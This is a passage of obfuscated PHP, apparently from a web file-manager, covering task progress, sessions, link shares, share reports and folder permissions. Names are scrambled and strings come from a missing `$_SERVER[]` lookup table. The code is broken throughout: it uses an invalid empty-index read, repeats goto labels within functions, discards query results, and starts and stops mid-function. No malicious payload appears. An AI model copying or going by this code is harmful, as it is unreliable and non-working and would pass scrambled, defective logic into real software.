copyFileStart($e, $aˬ͎, $b, $D󌰉, $AҪ, $f) { goto A䎫ԃ; D: $this->update(); goto fҋΑք; A䎫ԃ: $Cά =& $_SERVER[]; $Cￄ = $AҪ; if ($Cￄ == $GLOBALS[$Cά[1577]]) { $Cￄ = $GLOBALS[$Cά[1578]]; } goto A᪆; a㏂: $eߤ߇[$Cά[1564]] = $Cￄ; $eߤ߇[$Cά[1566]] = (int) $e->size($aˬ͎); $eߤ߇[$Cά[1567]] = 0; goto B٢; A᪆: $GLOBALS[$Cά[1578]] = $AҪ; $GLOBALS[$Cά[1577]] = $f; $eߤ߇ =& $this->task; goto a㏂; B٢: $eߤ߇[$Cά[1023]] = $Cά[33]; $eߤ߇[$Cά[1568]] = $Cά[33]; $eߤ߇[$Cά[1569]] = 0; goto D; fҋΑք: } public function copyFileEnd($E֋, $fĊ, $d夎, $F, $aӗ, $CĞ) { $Eʠ =& $_SERVER[]; $a =& $this->task; $a[$Eʠ[1567]] = $a[$Eʠ[1566]]; $a[$Eʠ[1568]] = $Eʠ[33]; if ($aӗ == $a[$Eʠ[1564]]) { $a[$Eʠ[1570]] += $a[$Eʠ[1566]]; $a[$Eʠ[1571]] = $a[$Eʠ[1570]]; $this->update(1); } else { $this->update(); $a[$Eʠ[1567]] = 0; } self::log($Eʠ[1579] . $fĊ . $Eʠ[66] . $F . $Eʠ[227] . $aӗ . $Eʠ[1580] . $a[$Eʠ[1564]]); } public function updateFileEnd($cտ, $FӨ) { goto f; a: $Aϋ[$E[1566]] = $FӨ; $Aϋ[$E[1570]] += $FӨ; $Aϋ[$E[1571]] = $Aϋ[$E[1570]]; goto F; F: $this->update(1); self::log($E[1581] . $cտ); goto Dݕ; f: $E =& $_SERVER[]; $Aϋ =& $this->task; $Aϋ[$E[1564]] = $cտ; goto a; Dݕ: } public function sourceModelCopy($e؛) { goto aլ; A: switch ($f) { case $C[530]: $a쟈 = 1; break; case $C[533]: $aꔑ[$C[1564]] = $cՕ[$C[28]]; break; case $C[535]: $a쟈 = intval($e؛[$C[375]] * 0.4); break; case $C[537]: $a쟈 = intval($e؛[$C[375]] * 0.2); break; case $C[539]: $a쟈 = intval($e؛[$C[375]] * 0.4); break; } $this->update($a쟈); $this->sourceModelCopyFlag = !1; goto Fʝǩҳ; aլ: $C =& $_SERVER[]; $f = $e؛[0]; $cՕ = $e؛[1]; goto bܥ; bܥ: $aꔑ =& $this->task; $this->sourceModelCopyFlag = !0; $a쟈 = 0; goto A; Fʝǩҳ: } public function sourceRemove($bč, $dȿˑ) { $F􋿙 =& $_SERVER[]; $this->sourceModelCopyFlag = !0; $c = 1; if (isset($bč[$F􋿙[80]])) { $c = $bč[$F􋿙[80]][$F􋿙[78]] + $bč[$F􋿙[80]][$F􋿙[79]] + 1; } $this->update($c); $this->sourceModelCopyFlag = !1; } public function sourceMove($AЇ) { $this->sourceRemove($AЇ, !1); } public function curlProgress($aƖ, $B, $f, $bǨ, $fζ) { $D =& $_SERVER[]; $B =& $this->task; if ($fζ > 0) { $B[$D[1023]] = $D[1582]; $B[$D[1568]] = $D[106]; if ($B[$D[1566]]) { $B[$D[1567]] = $fζ; } if ($B[$D[1569]]) { $B[$D[1567]] = $fζ + $B[$D[1569]]; } } else { if ($f > 0) { if ($B[$D[1566]] == $B) { $B[$D[1567]] = $f; $B[$D[1023]] = $D[1583]; $B[$D[1568]] = $D[1093]; } } } $this->update(); } public function curlProgressStart($fӋԄ) { } public function curlProgressEnd($F) { goto DӔ; DӔ: $D˭Ҕ =& $_SERVER[]; $F =& $this->task; $fƎ = curl_getinfo($F); goto dÃʂ; dÃʂ: $C = $fƎ[$D˭Ҕ[1584]]; if ($C == -1) { $C = $fƎ[$D˭Ҕ[1585]]; } if ($F[$D˭Ҕ[1568]] == $D˭Ҕ[106] && $C) { $F[$D˭Ҕ[1569]] += $C; } goto dѼ㕇; dѼ㕇: $this->update(); goto f; f: } } goto aᝒ; b͂: class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\x6d\x5f\163\x65\x73\x73\x69\x6f\156"; public function get($cի) { $Bإԏ =& $_SERVER[]; $dݕ󼣝 = $this->where(array($Bإԏ[1811] => $cի))->find(); if (!is_array($dݕ󼣝)) { return !1; } return $dݕ󼣝[$Bإԏ[728]]; } public function set($e៉, $F, $AčǺ = 3600) { $a =& $_SERVER[]; $d = array($a[1811] => $e៉, $a[1719] => $F, $a[1812] => $AčǺ + time()); if (Session::get($a[1813])) { $d[$a[1523]] = Session::get($a[1813]); } else { $d[$a[1523]] = 0; } if ($this->get($e៉)) { return $this->where(array($a[1811] => $e៉))->save($d); } else { return $this->add($d, array(), !0); } } public function remove($Aመ) { return $this->where(array($_SERVER[][1811] => $Aመ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[][1814] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\145"; protected $dataAuto = array(array("\x6d\x6f\144\151\x66\171\124\151\155\145", "\164\x69\x6d\145", "\151\156\x73\145\x72\164\54\165\x70\x64\141\x74\145", "\x66\x75\x6e\x63\x74\151\157\x6e"), array("\143\x72\x65\141\x74\145\x54\x69\155\x65", "\x74\x69\x6d\145", "\151\x6e\x73\x65\162\164", "\146\x75\156\143\164\151\x6f\156"), array("\x6f\160\164\x69\157\156\x73", '', "\151\x6e\163\x65\x72\x74\x2c\x75\160\x64\x61\x74\145\54\163\x65\x6c\145\143\x74", "\x6a\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($E) { $B돃 =& $_SERVER[]; $C = isset($E[0]) ? $E[0] : !1; return array($B돃[1815] => array(USER_ID, $B돃[1816]), $B돃[1759] => array($C, $B돃[1817])); } protected function listSimple() { $Fם = array($_SERVER[][1523] => USER_ID); $F؛ = $this->field($this->fieldList)->where($Fם)->select(); return $F؛ ? $F؛ : array(); } protected function getInfo($bþА, $B = false) { $Aۗ =& $_SERVER[]; if ($B) { return $this->_getShareInfo(array($Aۗ[462] => $bþА)); } $eƏ = $this->cacheFunctionGet($Aۗ[1766], $bþА); return $eƏ; } public function getInfoByHash($dŸ) { return $this->_getShareInfo(array($_SERVER[][464] => $dŸ)); } public function getInfoByPath($cĎ̈) { $Dȅ =& $_SERVER[]; $aٲ⓽ = array($Dȅ[1523] => USER_ID, $Dȅ[390] => $cĎ̈); return $this->_getShareInfo($aٲ⓽); } public function getInfoBySourcePath($E) { $Eĭ =& $_SERVER[]; $dԺ = array($Eĭ[1523] => USER_ID, $Eĭ[1070] => $E); return $this->_getShareInfo($dԺ); } private function _getShareInfo($aɜ) { goto Cɖ; fߑ: $aɜ = array($E[462] => $e[$E[462]]); $c· = $E[1818]; $b⥝ = Model($E[559])->order($E[388])->field($c·)->where($aɜ)->select(); goto e; e: if ($e[$E[390]] == $E[491]) { $e[$E[84]] = IO::info($e[$E[1070]]); } else { $e[$E[84]] = Model($E[1203])->pathInfo($e[$E[390]]); } $e[$E[1819]] = $b⥝; return $e; goto B𠊘; Cɖ: $E =& $_SERVER[]; $e = $this->where($aɜ)->find(); if (!$e) { return !1; } goto fߑ; B𠊘: } protected function getInfoAuth($fʏ֢) { $b =& $_SERVER[]; $Cޤ = $this->getInfo($fʏ֢); $Cޤ[$b[400]] = Model($b[476])->authMake($Cޤ[$b[1819]]); return $Cޤ; } protected function listData($b = null, $bِ = 300) { $D =& $_SERVER[]; $aЕϡ = array(array($D[467] => array($D[969], 0), $D[469] => array($D[969], 0), $D[1820] => $D[1774])); if ($b == $D[1821]) { $aЕϡ = array($D[467] => 1); } else { if ($b == $D[1055]) { $aЕϡ = array($D[469] => 1); } } $aЕϡ[$D[1523]] = USER_ID; $A = $this->where($aЕϡ)->selectPage($bِ); return $A; } protected function listToMe($Aʍ = 300) { goto dގ; e: if ($cӳ) { $a = array(array($bѩ[544] => SourceModel::TYPE_USER, $bѩ[478] => USER_ID), array($bѩ[544] => SourceModel::TYPE_GROUP, $bѩ[478] => array($bѩ[7], $cӳ)), $bѩ[1820] => $bѩ[1774]); } $b = Model($bѩ[559])->where($a)->selectPage($Aʍ); $f = array_to_keyvalue_group($b[$bѩ[365]], $bѩ[462]); goto eƍ; dގ: $bѩ =& $_SERVER[]; $cӳ = Model($bѩ[1822])->userGroupParents(USER_ID); $a = array($bѩ[544] => SourceModel::TYPE_USER, $bѩ[478] => USER_ID); goto e; a: $D = array($bѩ[1824] => $b, $bѩ[1825] => $b[$bѩ[362]]); return $D; goto e޽; eƍ: if (!$f) { return $b; } $aѹæ = $bѩ[1823]; $a = array($bѩ[462] => array($bѩ[405], array_keys($f))); goto d; d: $b = $this->field($aѹæ)->where($a)->select(); foreach ($b as $e => &$f܋) { $f܋[$bѩ[1819]] = $f[$f܋[$bѩ[462]]]; } unset($f܋); goto a; e޽: } protected function shareAdd($C껅֠, $A) { $fꖴ =& $_SERVER[]; $EҸ = $this->_addShareData($C껅֠, $A); if (!empty($A[$fꖴ[1826]])) { $this->_shareAuthSet($EҸ, $A[$fꖴ[1826]]); } $this->shareEventAdd($C껅֠, $A, $fꖴ[1058]); return $EҸ; } private function shareEventAdd($d·Ö, $E, $ā = "\141\144\144") { goto A; A: $b覊 =& $_SERVER[]; if ($ā == $b覊[1058]) { if ($E[$b覊[467]] == $b覊[86]) { Model($b覊[528])->eventShare($d·Ö, $b覊[1827]); } if ($E[$b覊[469]] == $b覊[86]) { Model($b覊[528])->eventShare($d·Ö, $b覊[1828]); } return; } $Bز = $this->getInfoByPath($d·Ö); goto D; A: return; goto AȨҶ; D: $D뻱ް = $b覊[1829]; if ($Bز[$b覊[467]] == $b覊[491] && $E[$b覊[467]] == $b覊[86]) { $D뻱ް = $b覊[1827]; } if ($Bز[$b覊[467]] == $b覊[86] && $E[$b覊[467]] == $b覊[491]) { $D뻱ް = $b覊[1830]; } goto aױ; aױ: if ($Bز[$b覊[469]] == $b覊[491] && $E[$b覊[469]] == $b覊[86]) { $D뻱ް = $b覊[1828]; } if ($Bز[$b覊[469]] == $b覊[86] && $E[$b覊[469]] == $b覊[491]) { $D뻱ް = $b覊[1831]; } Model($b覊[528])->eventShare($d·Ö, $D뻱ް); goto A; AȨҶ: } private function _addShareData($b߆, $B⎳ = array()) { goto BӋ; B燲: $dǷ׃Ȍ = array($cߟ[1515] => USER_ID, $cߟ[404] => $b߆, $cߟ[1428] => $cߟ[33], $cߟ[467] => 0, $cߟ[469] => 0, $cߟ[1070] => $cߟ[33], $cߟ[303] => $cߟ[33], $cߟ[849] => $cߟ[33], $cߟ[1833] => 0, $cߟ[1834] => 0, $cߟ[470] => 0, $cߟ[471] => $cߟ[33], $cߟ[464] => $cߟ[33]); $e˷ = explode($cߟ[47], $cߟ[1835]); foreach ($e˷ as $a߬) { if (!isset($B⎳[$a߬])) { continue; } $dǷ׃Ȍ[$a߬] = $B⎳[$a߬]; } goto F; F: $bڃҎ = $this->add($dǷ׃Ȍ); $Bܔ = array($cߟ[464] => short_id($bڃҎ)); $this->where(array($cߟ[461] => $bڃҎ))->save($Bܔ); goto C٤; BӋ: $cߟ =& $_SERVER[]; $cɓˑ = array($cߟ[404] => $b߆, $cߟ[1515] => USER_ID); if ($b߆ == 0) { $cɓˑ = array($cߟ[1832] => $B⎳[$cߟ[1070]], $cߟ[1515] => USER_ID); } goto dŔ; C٤: return $bڃҎ; goto Aևċ; dŔ: if ($d얋 = $this->where($cɓˑ)->find()) { return $d얋[$cߟ[462]]; } if ($b߆ == 0) { $A՛ȉ = array($cߟ[28] => get_path_this($B⎳[$cߟ[75]])); } else { $A՛ȉ = Model($cߟ[790])->sourceInfo($b߆); if (!$A՛ȉ) { return !1; } } if (!$B⎳[$cߟ[1428]]) { $B⎳[$cߟ[1428]] = $A՛ȉ[$cߟ[28]]; } goto B燲; Aևċ: } private function _shareAuthSet($dȿ, $bۼ) { goto dд; F񭆜: $cŉ->where(array($A[462] => $dȿ))->delete(); $CԬҰ = array(); foreach ($bۼ as $A͑) { $Eԧ蓲 = SourceModel::TYPE_USER; if ($A͑[$A[398]] == SourceModel::TYPE_GROUP) { $Eԧ蓲 = SourceModel::TYPE_GROUP; } $cǎ = array($A[462] => $dȿ, $A[398] => $Eԧ蓲, $A[478] => intval($A͑[$A[478]]), $A[1782] => 0, $A[1836] => -1); if ($A͑[$A[1782]]) { $cǎ[$A[1782]] = $A͑[$A[1782]]; } else { if ($A͑[$A[1836]]) { $cǎ[$A[1836]] = $A͑[$A[1836]]; } } $CԬҰ[] = $cǎ; } goto C; dд: $A =& $_SERVER[]; if (!is_array($bۼ)) { return !1; } $cŉ = Model($A[1786]); goto F񭆜; C: return $cŉ->addAll($CԬҰ, array(), !0); goto E; E: } public function numViewAdd($Bؚ) { $a༂ =& $_SERVER[]; $c։ = array($a༂[461] => $Bؚ); $this->where($c։)->setAdd($a༂[1833]); } public function numDownloadAdd($a) { $Eķіϥ =& $_SERVER[]; $Fڎݍ = array($Eķіϥ[461] => $a); $this->where($Fڎݍ)->setAdd($Eķіϥ[1834]); } protected function shareEdit($F޷ꎢ, $B⥲) { goto Aӳꑄ; Aᝌ: foreach ($c as $Aə) { if (!array_key_exists($Aə, $B⥲)) { continue; } $bۉ[$Aə] = $B⥲[$Aə]; } $this->shareEventAdd($C[$Aۂ[390]], $B⥲, $Aۂ[1653]); $this->where(array($Aۂ[461] => $F޷ꎢ))->save($bۉ); goto eó; Aӳꑄ: $Aۂ =& $_SERVER[]; $C = $this->getInfo($F޷ꎢ); if (!$C) { return !1; } goto C; C: $this->_checkLinkShare($B⥲, $C); $bۉ = array(); $c = explode($Aۂ[47], $Aۂ[1837]); goto Aᝌ; eó: if (isset($B⥲[$Aۂ[1826]])) { $this->_shareAuthSet($F޷ꎢ, $B⥲[$Aۂ[1826]]); } return !0; goto aӡ; aӡ: } private function _checkLinkShare($dƕľ, $C) { goto b; b: $a =& $_SERVER[]; if ($dƕľ[$a[467]] != $a[86]) { return; } $AӞ = $C[$a[84]][$a[390]]; goto a֜; a֜: if ($C[$a[84]][$a[29]] != $a[173]) { $fЍ = $this->_folderReport($AӞ); if (!$fЍ) { return; } show_json(LNG($a[1838]) . $a[1839] . $fЍ, !1); } $Bʎ = Model($a[790])->fileInfoGet($C[$a[84]][$a[390]]); if (!$Bʎ) { return; } goto C燼; C燼: $B죌 = $this->shareFileMeta($Bʎ[$a[441]]); if (isset($B죌[$a[370]]) && $B죌[$a[370]] == $a[86]) { show_json(LNG($a[1840]), !1); } goto Bǌۛ; Bǌۛ: } private function _folderReport($eʹ) { goto C؞; aѢ߬: $cͩ = substr($f[$eʝ߷[481]], strpos($f[$eʝ߷[481]], $bϵ򐌢)); $BӋ = array($eʝ߷[390] => array($eʝ߷[7], trim($cͩ, $eʝ߷[47]))); $bƅ = Model($eʝ߷[790])->where($BӋ)->field($eʝ߷[28])->select(); goto a; a: $F = array_to_keyvalue($bƅ, $eʝ߷[33], $eʝ߷[28]); $F[] = $f[$eʝ߷[28]]; return implode($eʝ߷[8], $F); goto dӱ⍑; Dê: if (!$b) { return !1; } $b = array_to_keyvalue($b, $eʝ߷[33], $eʝ߷[441]); $bϵ򐌢 = $eʝ߷[47] . $eʹ . $eʝ߷[47]; goto A̴ψ; A̴ψ: $BӋ = array($eʝ߷[441] => array($eʝ߷[7], $b), $eʝ߷[481] => array($eʝ߷[378], "\45{$bϵ򐌢}\x25"), $eʝ߷[417] => 0); $f = Model($eʝ߷[790])->where($BӋ)->field($eʝ߷[1842])->find(); if (!$f) { return !1; } goto aѢ߬; C؞: $eʝ߷ =& $_SERVER[]; $BӋ = array($eʝ߷[441] => array($eʝ߷[969], 0), $eʝ߷[725] => 3); $b = Model($eʝ߷[1841])->where($BӋ)->field($eʝ߷[441])->select(); goto Dê; dӱ⍑: } protected function remove($eԎĤ) { goto b屒; d҅: for ($b = 0; $b < count($CǞ); $b++) { $b = $this->getInfo($CǞ[$b]); if ($b[$c՛[469]] == $c՛[86]) { Model($c՛[528])->eventShare($b[$c՛[390]], $c՛[1831]); } if ($b[$c՛[467]] == $c՛[86]) { Model($c՛[528])->eventShare($b[$c՛[390]], $c՛[1830]); } } return $e۲; goto Eǂ; cر䎶: $e۲ = $this->where($b񶻽)->delete(); if ($e۲) { Model($c՛[559])->where(array($c՛[462] => $eԎĤ))->delete(); } $CǞ = is_array($eԎĤ) ? $eԎĤ[1] : array($eԎĤ); goto d҅; b屒: $c՛ =& $_SERVER[]; if (is_array($eԎĤ)) { $eԎĤ = array($c՛[7], $eԎĤ); } $b񶻽 = array($c՛[462] => $eԎĤ); goto cر䎶; Eǂ: } protected function removeBySource($Fۤ) { goto a͏ڡ; Aռ֢: $this->where($c͊)->delete(); Model($bÔ[559])->where($c͊)->delete(); goto eű˂; d߅: $B = array_to_keyvalue($B, $bÔ[33], $bÔ[462]); if (!$B) { return; } $c͊ = array($bÔ[461] => array($bÔ[405], $B)); goto Aռ֢; a͏ڡ: $bÔ =& $_SERVER[]; $c͊ = array($bÔ[404] => array($bÔ[405], $Fۤ)); $B = $this->field($bÔ[462])->where($c͊)->select(); goto d߅; eű˂: } public function listAll($eӿ򴣡) { goto D򈢏; d: $eݸ = $this->_makeOrder()->where($c槢腦)->selectPage(20); if (empty($eݸ[$AҐ膜[365]])) { return array(); } $this->_listDataApply($eݸ[$AҐ膜[365]]); goto E; aÑ: if ($eӿ򴣡[$AҐ膜[738]]) { $fຎ = $eӿ򴣡[$AҐ膜[470]] ? $eӿ򴣡[$AҐ膜[470]] : strtotime(date($AҐ膜[1843])); $c槢腦[$AҐ膜[192]] = array($AҐ膜[329], array($eӿ򴣡[$AҐ膜[738]], $fຎ)); } if ($eӿ򴣡[$AҐ膜[29]]) { $c槢腦[$eӿ򴣡[$AҐ膜[29]]] = 1; } else { $c槢腦[] = array($AҐ膜[467] => array($AҐ膜[969], 0), $AҐ膜[469] => array($AҐ膜[969], 0), $AҐ膜[1820] => $AҐ膜[1774]); } if ($eӿ򴣡[$AҐ膜[1770]]) { $c槢腦[] = array($AҐ膜[464] => $eӿ򴣡[$AҐ膜[1770]], $AҐ膜[1428] => array($AҐ膜[378], "\x25{$eӿ򴣡[$AҐ膜[1770]]}\x25"), $AҐ膜[1820] => $AҐ膜[1774]); } goto d; E: return $eݸ; goto bϟܵ; D򈢏: $AҐ膜 =& $_SERVER[]; $c槢腦 = array(); if ($eӿ򴣡[$AҐ膜[1523]]) { $c槢腦[$AҐ膜[1523]] = $eӿ򴣡[$AҐ膜[1523]]; } goto aÑ; bϟܵ: } public function listDataApply($fٞ) { $this->_listDataApply($fٞ); return $fٞ; } private function _listDataApply(&$fЅ) { goto A; eպ: $fՃ = array_to_keyvalue($fЅ, $E蹉[33], $E蹉[390]); $D󍤉 = Model($E蹉[790])->sourceListInfo($fՃ, !0); foreach ($fЅ as &$f) { $Aە = $f[$E蹉[1523]]; $f[$E蹉[1844]] = $eŸ[$Aە] ? $eŸ[$Aە] : !1; $eܹ = $f[$E蹉[390]]; $f[$E蹉[84]] = $D󍤉[$eܹ] ? $D󍤉[$eܹ] : !1; } goto b㿔; A: $E蹉 =& $_SERVER[]; $fķ = array_to_keyvalue($fЅ, $E蹉[33], $E蹉[1523]); $eŸ = Model($E蹉[501])->userListInfo(array_unique($fķ)); goto eպ; b㿔: unset($f); goto fٖ㿏; fٖ㿏: } private function _makeOrder($f؆ŕ = '') { goto A膌; A膌: $c =& $_SERVER[]; $B = array($c[192], $c[470], $c[1833], $c[1834]); $dӅ = array($c[422] => $c[423], $c[424] => $c[425]); goto BÝ; fЋ: $f؆ŕ = $f؆ŕ . "{$cžԓ}\x20{$Eƌ}"; return $this->order($f؆ŕ); goto D܂ӣ; BÝ: $cžԓ = Input::get($c[429], $c[7], $c[410], $B); $Eƌ = Input::get($c[430], $c[7], $c[1845], array($c[1769], $c[424])); $Eƌ = $dӅ[$Eƌ]; goto fЋ; D܂ӣ: } public function reportAdd($e젳) { $Eա =& $_SERVER[]; $F櫦 = array($Eա[462] => $e젳[$Eա[462]], $Eա[1523] => USER_ID); if (Model($Eա[1841])->where($F櫦)->find()) { return !1; } $b󘆪 = array($Eա[462] => $e젳[$Eա[462]], $Eա[1428] => $e젳[$Eա[1428]], $Eա[390] => $e젳[$Eա[390]], $Eա[441] => $e젳[$Eա[441]], $Eա[1523] => USER_ID, $Eա[29] => $e젳[$Eա[29]], $Eա[425] => $e젳[$Eա[425]]); return Model($Eա[1841])->add($b󘆪); } public function reportList($Aݛ) { goto cޯ; Fˇ: $dŶ = array($C[422] => $C[423], $C[424] => $C[425]); $d = $C[1850] . $dŶ[$e՗]; $AŔ = Model($C[1841])->where($d༅)->order($d)->selectPage(20); goto dȉۅ; cޯ: $C =& $_SERVER[]; $d༅ = array(); if ($Aݛ[$C[738]]) { $Cʋ = $Aݛ[$C[470]] ? $Aݛ[$C[470]] : strtotime(date($C[1843])); $d༅[$C[192]] = array($C[329], array($Aݛ[$C[738]], $Cʋ)); } goto e󉖋˭; dȉۅ: if (empty($AŔ[$C[365]])) { return array(); } $this->_listDataApply($AŔ[$C[365]]); return $AŔ; goto e㊺; e󉖋˭: if (isset($Aݛ[$C[29]]) && in_array($Aݛ[$C[29]], array($C[86], $C[1846], $C[1847], $C[1848], $C[1849]))) { $d༅[$C[29]] = $Aݛ[$C[29]]; } if (isset($Aݛ[$C[725]]) && in_array($Aݛ[$C[725]], array($C[491], $C[86], $C[1846], $C[1847]))) { $d༅[$C[725]] = $Aݛ[$C[725]]; } $e՗ = Input::get($C[430], $C[7], $C[1845], array($C[1769], $C[424])); goto Fˇ; e㊺: } public function reportStatus($D頳֡) { goto e; Aڪ: return $eȧ; goto C⟆; fŨ: $eȧ = Model($E믒[1841])->where($FΤ)->save($bޭ); if ($D頳֡[$E믒[725]] == $E믒[1846]) { if ($Dٴ[$E믒[441]] != $E믒[491] && $this->shareFileMeta($Dٴ[$E믒[441]])) { $this->shareFileMeta($Dٴ[$E믒[441]], 0); } $this->remove($Dٴ[$E믒[462]]); return !0; } if ($eȧ && $D頳֡[$E믒[725]] == $E믒[1847]) { $cȞ = $bޭ[$E믒[725]] == $E믒[1847] ? 1 : 0; $this->shareFileMeta($Dٴ[$E믒[441]], $cȞ); $this->removeByFile($Dٴ[$E믒[441]]); } goto Aڪ; C: if (!$Dٴ) { return !1; } $bޭ = array($E믒[725] => $D頳֡[$E믒[725]]); if ($D頳֡[$E믒[725]] == $E믒[1847] && $Dٴ[$E믒[725]] == $E믒[1847]) { $bޭ[$E믒[725]] = 0; } goto fŨ; e: $E믒 =& $_SERVER[]; $FΤ = array($E믒[388] => $D頳֡[$E믒[388]]); $Dٴ = Model($E믒[1841])->where($FΤ)->field($E믒[1851])->find(); goto C; C⟆: } private function removeByFile($e) { goto d忢; CȆ: $dך = array_to_keyvalue($a, $eܜ[33], $eܜ[462]); $this->remove($dך); goto Aؓ; d忢: $eܜ =& $_SERVER[]; $a = Model($eܜ[790])->where(array($eܜ[441] => $e))->field($eܜ[390])->select(); $e = array_to_keyvalue($a, $eܜ[33], $eܜ[390]); goto ḇ; ḇ: $F = array($eܜ[390] => array($eܜ[7], $e), $eܜ[467] => 1); $a = Model($eܜ[1663])->where($F)->field($eܜ[462])->select(); if (empty($a)) { return; } goto CȆ; Aؓ: } private function shareFileMeta($bߓ, $E߲ = null) { $aч =& $_SERVER[]; $cٹ = array($aч[441] => $bߓ, $aч[92] => $aч[1852]); if (is_null($E߲)) { return Model($aч[1853])->where($cٹ)->find(); } $cٹ[$aч[370]] = $E߲; Model($aч[1853])->add($cٹ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\x72\x63\x65\137\141\165\164\150"; public function getAuth($FՒ) { goto bꛖ; bꛖ: $bא =& $_SERVER[]; $D = $this->sourceAuthSelect($FՒ); $D = array(); goto bŦƊ; bڤ: array_multisort($eȼ, SORT_DESC, $D); return $D; goto d; bŦƊ: $eȼ = array(); $bЋר = 2 << 25; foreach ($D as $bҊ) { goto cक़; C츕ަ: $Dӏ툢 = 0; if ($bҊ[$bא[398]] == SourceModel::TYPE_GROUP) { $Dӏ툢 = $bЋר * 2; } if ($bҊ[$bא[398]] == SourceModel::TYPE_USER) { $Dӏ툢 = $bЋר; } goto d; d: if ($bҊ[$bא[398]] == SourceModel::TYPE_USER && $bҊ[$bא[478]] == $bא[491]) { $Dӏ툢 = 0; } $eȼ[] = $cԸ[$bא[400]] + $Dӏ툢; goto f; cक़: $cԸ = Model($bא[1854])->listData($bҊ[$bא[1782]]); if (!$cԸ) { continue; } $D[] = $bҊ; goto C츕ަ; f: } goto bڤ; d: } public function sourceAuthSelect($d) { goto Bܕ; Bܕ: $F褷 =& $_SERVER[]; static $Eڍ = array(); $DӰظ = is_array($d) ? !1 : !0; goto Bʬ; Bʬ: if ($DӰظ) { $d = array($d); } $b = array(); foreach ($d as $DȈ) { if (isset($Eڍ[$DȈ])) { $b[$DȈ] = $Eڍ[$DȈ]; } } goto Cƹ; DƬ: if ($DӰظ) { return $f; } return $Cś߾; goto dؿ; aܒܮ: $f = $this->field($CՊ׫)->order($F褷[388])->where($Fߘ)->select(); $Cś߾ = array_to_keyvalue_group($f, $F褷[390]); foreach ($d as $DȈ) { $Eڍ[$DȈ] = $Cś߾[$DȈ] ? $Cś߾[$DȈ] : array(); } goto DƬ; Cƹ: if (count($b) == count($d)) { return $DӰظ ? $b[$d[0]] : $b; } $CՊ׫ = $F褷[1855]; $Fߘ = array($F褷[390] => array($F褷[7], $d)); goto aܒܮ; dؿ: } public function setAuth($d, $e) { goto b; d: if ($Fˉ[$C[398]] != SourceModel::TYPE_GROUP) { return !1; } $bޔ = 1; $b = $Fˉ[$C[478]]; goto dѥ範; f؊: foreach ($e as $C) { if (!in_array($C[$C[398]], $F)) { show_json(LNG($C[1856]), !1); } if ($b != $bޔ) { if ($C[$C[398]] == SourceModel::TYPE_GROUP) { } if ($C[$C[478]] != 0 && !in_array($C[$C[478]], $d禿)) { } } if ($C[$C[478]] == 0) { $C[$C[398]] = SourceModel::TYPE_USER; } $eؗʊ[] = array($C[390] => $d, $C[398] => intval($C[$C[398]]), $C[478] => intval($C[$C[478]]), $C[1782] => intval($C[$C[1782]]) ? intval($C[$C[1782]]) : 0, $C[1836] => intval($C[$C[1836]]) ? intval($C[$C[1836]]) : -1); } $this->where(array($C[404] => $d))->delete(); $this->addAll($eؗʊ); goto C; b: $C =& $_SERVER[]; $Fˉ = Model($C[1203])->sourceInfo($d); if (!$Fˉ) { return !1; } goto d; dѥ範: if ($b != $bޔ) { $d = array($C[1686] => $b); $d禿 = Model($C[1768])->field($C[1523])->where($d)->select(); $d禿 = array_to_keyvalue($d禿, $C[33], $C[1523]); } $F = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $eؗʊ = array(); goto f؊; C: return !0; goto d; d: } public function authClear($D宑) { $B =& $_SERVER[]; $f˾ݍ = Model($B[1203])->sourceInfo($D宑); $fѳ = array($D宑); if ($f˾ݍ[$B[397]] == $B[86]) { $D = array($B[548] => array($B[507], $f˾ݍ[$B[481]] . $D宑 . $B[508])); $fѳ = Model($B[1203])->field($B[404])->where($D)->getField($B[390], !0); $fѳ[] = $D宑; } $this->where(array($B[404] => array($B[405], $fѳ)))->delete(); return !0; } public function getAllChildren($D) { goto c祇; e: $F = Model($f[790])->field($Bө)->where($cҔ)->select(); $f𦪶 = array($D); foreach ($F as $aЃ) { foreach ($a as $fج) { $DՂ踗 = $f[47] . $fج . $f[47]; $BЂ = $aЃ[$f[481]] . $aЃ[$f[390]] . $f[47]; if (strstr($BЂ, $DՂ踗)) { $f𦪶[] = $aЃ[$f[390]]; break; } } } goto B񾠱; eĊ: if (!$d) { return array(); } $Bө = $f[1857]; $cҔ = array($f[390] => array($f[7], $d), $f[417] => $f[491]); goto e; c祇: $f =& $_SERVER[]; $a͡ԝ = Model($f[1203])->sourceInfo($D); if ($a͡ԝ[$f[397]] != $f[86]) { return $this->sourceListAuth(array($D)); } goto AË; D: if ($a͡ԝ[$f[472]] == $f[491] && $a͡ԝ[$f[478]] != $C) { $a = $this->groupChidldAllRootSource($a͡ԝ[$f[478]]); } $d = $this->field($f[390])->group($f[390])->select(); $d = array_to_keyvalue($d, $f[33], $f[390]); goto eĊ; AË: if ($a͡ԝ[$f[398]] != SourceModel::TYPE_GROUP) { return array(); } $C = 1; $a = array($D); goto D; B񾠱: return $this->sourceListAuth($f𦪶); goto AƅÍ; AƅÍ: } private function sourceListAuth($A݃) { goto a; a: $Dӑ· =& $_SERVER[]; $C = Model($Dӑ·[1203])->sourceListInfo($A݃, !0); $dó = $this->sourceAuthSelect($A݃); goto b; b: $Cҥ = array(); $C = array(); foreach ($C as $c˱ٚڏ) { goto Bԗ; Bԗ: unset($c˱ٚڏ[$Dӑ·[428]]); unset($c˱ٚڏ[$Dӑ·[426]]); unset($c˱ٚڏ[$Dӑ·[400]]); goto Cݢ; Cݢ: unset($c˱ٚڏ[$Dӑ·[84]]); $E݌ = $dó[$c˱ٚڏ[$Dӑ·[390]]]; if (!$E݌) { continue; } goto eʙ; dϾ: $b = count(explode($Dӑ·[8], trim($c˱ٚڏ[$Dӑ·[489]], $Dӑ·[8]))); $C[] = $b + ($c˱ٚڏ[$Dӑ·[29]] == $Dӑ·[76] ? 0 : 1000); goto bՎ૫; eʙ: $c˱ٚڏ[$Dӑ·[1858]] = $this->authTargetInfo($E݌); $c˱ٚڏ[$Dӑ·[489]] = rtrim($c˱ٚڏ[$Dӑ·[484]], $Dӑ·[8]) . $Dӑ·[8] . ltrim($c˱ٚڏ[$Dӑ·[489]], $Dӑ·[8]); $Cҥ[] = $c˱ٚڏ; goto dϾ; bՎ૫: } goto B펩; B펩: 